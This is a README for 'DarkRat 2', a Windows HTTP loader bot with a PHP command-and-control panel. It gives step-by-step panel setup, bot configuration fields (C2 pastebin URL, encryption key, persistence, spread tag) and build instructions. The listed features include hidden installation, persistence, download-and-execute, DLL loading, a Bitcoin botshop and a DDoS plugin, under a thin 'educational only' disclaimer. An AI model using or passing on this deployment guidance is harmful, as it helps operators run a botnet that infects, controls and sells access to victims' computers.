# DarkRat 2 (Education Proposal Only)

Darkrat is designed as a HTTP loader, it is coded in C++ with no dependency, the Current bot is design for the Windows API!
this means, DarkRat has no Cross Platform Support.

A Sample Documentation is hosted here [http://wsyl2u7uvfml6p7p.onion/docs/](http://wsyl2u7uvfml6p7p.onion/docs/)
If anyone would like to support this project would be a new documentation with flawless English very nice. Thanks for your Help 


## Getting Started
  - Connect to your Server via SSH
  - Install Apache2, PHP7.x, MYSQL (MariaDB Server in Ubuntu 18) and PHPMYADMIN
  - Enable .htaccess
  ```php
<Directory /var/www/html>
        Options FollowSymLinks
        AllowOverride all
        Require all granted
</Directory>
  ```
  - Unpack the Panel.zip
  - Upload Files to the root of your www:data (By Default /var/www/html/)
  - on a new Installation delete the index.html
  - Give www:data Write/Read/Execute permission on all uploaded files
  - open your domain oder serverip / Now you see the install page
  - Flowing the Setup and install the Panel, or install it Manual by import the sql
  - by default enter username: admin password: admin 

## Config Example

```php
<?php

$pdo = new PDO('mysql:host=localhost;dbname=darkrat', 'username', 'password');
```


## Build a Bot

- Create a License file named "darkrat.lic" and enter your License Key.
- Create a file named "config.json" and enter your Gate Settings

## Shortnames:
- ek  =  Encryption Key (Lenght 32)
- pu  =  Pastebin URL OR Direct Encrypted URL   
```json
{
"pu": "keRwrh9WFcNrWnCLM96VuBRRMCYg/UPgRTb09A=="
 }
```
- mux =  A Random Mutex
- sup =  Startup true/false
- ri  =  Request Interval in secounds
- pre =  Running Persistence true/false
- st  =  Spread Tag
- ua  =  User Agent for Post Requests
- pn  =  Some Example for DarkRat Developers


## Full Config Example 
```json
{
  "ek": "randomkey",                        
  "pu": "http://pastebin.com/raw/random",                            
  "mux": "3mCUq1z",                        
  "sup": "false",                          
  "ri":  "5",                              
  "pre": "false",                           
  "st": "main",                             
  "ua":  "SUq1rx",                          
  "pn":  { "FOO":"BAR" }                   
 }
```
- Open the builder.exe and enter your username
- Select create from Config File if you created one, if not select create from Terminal.
- Finished. spider.exe is created, Backtest your payload on a VM.


### Panel
  - Template System based on [Smarty](https://www.smarty.net/)
  - Dynamic URL Routing 
  - Multi User Support
  - Plugin System
  - Statistics of Bots & online rates
  - Advanced Bot Informations
  - Task Tracking 
  - Task Geo Targeting System 
  - Task Software Targeting System (for .net software)

### Bot 2.1.3
  - Running Persistence
  - Startup Persistence
  - Installed hidden on the FileSystem 
  - Download & Execute
  - Update
  - Uninstall
  - Custom DLL Loading
  - Direct Connect or RAW forwarder (Like pastebin/gist also supported own plain/raw sites)
  
### Included Plugins
  - Botshop with autobuy Bitcoin API
  - Alpha version of a DDOS (NOT STABLE)
  - Examples


## Disclaimer
I, the creator, am not responsible for any actions, and or damages, caused by this software.
You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.
This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
By using this software, you automatically agree to the above.

## License
[![License](http://img.shields.io/:license-mit-blue.svg?style=flat-square)](/LICENSE)

Copyright (c) 2017-2019 DarkSpider
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
